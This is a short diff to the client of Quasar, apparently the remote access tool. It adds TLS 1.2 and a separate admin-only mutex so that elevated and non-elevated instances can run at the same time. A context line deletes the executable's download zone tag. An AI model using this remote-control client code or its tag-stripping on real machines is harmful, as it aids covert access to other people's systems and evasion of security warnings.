@@ -12,6 +12,8 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
+using System.Linq;
+using System.Net;
 using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
@@ -102,15 +104,36 @@ namespace Quasar.Client
         /// </summary>
         public void Run()
         {
+            // enable TLS 1.2
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
             // decrypt and verify the settings
             if (!Settings.Initialize())
                 Environment.Exit(1);
 
+            // Check if we're running with admin privileges
+            var userAccount = new UserAccount();
+            bool isAdmin = userAccount.Type == Quasar.Common.Enums.AccountType.Admin;
+            
+            // First try the normal mutex
             ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
-
-            // check if process with same mutex is already running on system
-            if (!ApplicationMutex.CreatedNew)
+            
+            // If normal mutex is taken and we're admin, try admin mutex instead
+            if (!ApplicationMutex.CreatedNew && isAdmin)
+            {
+                ApplicationMutex.Dispose();
+                // Use admin-specific mutex to allow both elevated and non-elevated to run
+                ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX + "_ELEVATED");
+                
+                // If admin mutex also exists, then exit (only allow one admin instance)
+                if (!ApplicationMutex.CreatedNew)
+                    Environment.Exit(2);
+            }
+            else if (!ApplicationMutex.CreatedNew)
+            {
+                // Non-admin and mutex is taken, exit
                 Environment.Exit(2);
+            }
 
             FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
 
